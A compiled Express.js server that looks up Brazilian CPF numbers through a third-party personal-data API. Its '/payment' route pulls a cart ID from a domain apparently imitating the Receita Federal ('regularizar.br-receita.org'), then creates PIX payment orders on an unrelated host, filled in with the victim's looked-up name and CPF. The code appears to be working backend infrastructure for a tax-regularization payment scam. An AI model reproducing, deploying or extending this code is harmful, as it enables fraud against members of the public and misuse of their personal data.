"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
// src/index.ts
const express_1 = __importStar(require("express"));
const dotenv_1 = __importDefault(require("dotenv"));
dotenv_1.default.config();
const app = (0, express_1.default)();
const port = process.env.PORT || 3000;
const cors_1 = __importDefault(require("cors"));
const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
app.use(express_1.default.json());
app.use((0, cors_1.default)({
    origin: '*'
}));
const consultaRouter = (0, express_1.Router)();
const cpfLimiter = (0, express_rate_limit_1.default)({
    windowMs: 60 * 1000, // 15 minutos
    max: 10, // max 60 requests por IP
    standardHeaders: true, // retorna infos em RateLimit-* headers
    legacyHeaders: false, // desativa X-RateLimit-* headers
});
const cpfConsulta = async (req, res, next) => {
    const { cpf } = req.params;
    try {
        const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
        const upstream = await fetch(apiUrl, { method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
            }
        });
        if (!upstream.ok) {
            return res
                .status(upstream.status)
                .json({ error: `Upstream retornou ${upstream.status}` });
        }
        const data = await upstream.json();
        return res.json(data);
    }
    catch (err) {
        next(err);
    }
};
consultaRouter.get('/:cpf', cpfLimiter, cpfConsulta);
app.use('/', consultaRouter);
const paymentRouter = (0, express_1.Router)();
const payment = async (req, res, next) => {
    const { cpf } = req.params;
    try {
        const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
        const upstream = await fetch(apiUrl, { method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
            }
        });
        if (!upstream.ok) {
            return res
                .status(upstream.status)
                .json({ error: `Upstream retornou ${upstream.status}` });
        }
        const data = await upstream.json();
        const paymentRes = await fetch('https://regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg', {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
            }
        });
        if (!paymentRes.ok) {
            return res
                .status(paymentRes.status)
                .json({ error: `Payment API retornou ${paymentRes.status}` });
        }
        const cartId = (await paymentRes.text()).trim();
        const orderPayload = {
            payment_method: 'pix',
            customer: {
                name: data.NAME || 'Nome Exemplo',
                email: 'customer@sememail.com',
                document: cpf,
                document_type: 'CPF'
            }
        };
        const getOrder = await fetch(`https://api-tenant.ads-information.top/cart/${cartId}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                Accept: 'application/json',
            },
        });
        if (!getOrder.ok) {
            return res.status(getOrder.status).json({ error: `Order APIsd retornou ${getOrder.status}` });
        }
        const getOrderData = await getOrder.json();
        if (getOrderData.completedOrders[0] && getOrderData.completedOrders[0].paid) {
            return res.json(getOrderData);
        }
        const orderRes = await fetch(`https://api-tenant.ads-information.top/cart/${cartId}/order?`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                Accept: 'application/json',
            },
            body: JSON.stringify(orderPayload),
        });
        if (!orderRes.ok) {
            console.log(await orderRes.json());
            return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
        }
        const orderData = await orderRes.json();
        return res.json(orderData);
    }
    catch (err) {
        next(err);
    }
};
paymentRouter.get('/:cpf', payment);
app.use("/payment", paymentRouter);
app.listen(port, () => {
    console.log(`🚀 Server rodando em http://localhost:${port}`);
});
